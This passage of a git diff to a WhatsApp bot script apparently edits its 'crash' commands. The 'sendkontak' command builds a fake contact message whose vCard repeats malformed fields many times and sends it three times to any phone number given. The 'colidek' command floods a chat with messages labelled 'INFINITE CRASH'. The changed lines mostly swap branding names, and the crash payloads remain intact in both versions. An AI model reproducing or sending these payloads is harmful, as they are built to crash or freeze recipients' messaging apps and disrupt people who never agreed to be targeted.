karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 haikal.sendContact(m.chat, global.ownerr, fkontaak)
 }
 }
@@ -5198,7 +5168,7 @@ break
 case 'sendkontak': {
 if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
 if (!text) throw `Nomernya?`
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:CXZA 935\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${philips}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓\nitem1.TEL:+6285788734756\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
 haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
 haikal.sendContact(`${text}@s.whatsapp.net`, global.ownerr, fkontaak)
@@ -5225,7 +5195,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 "fileLength": "64455",
 "pageCount": 1,
 "mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
-"fileName": `CXZA 935${philips}`,
+"fileName": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓${philips}`,
 "fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
 	}
 }
@@ -5236,92 +5206,52 @@ break
 case 'colidek' : {
 if (!mek.key.fromMe) return reply('Khusus Owner Ajg!')
                     a = await haikal.sendMessage(m.chat, {react: {  key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"}, {quoted: a})
-                    await haikal.sendMessage(m.chat, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
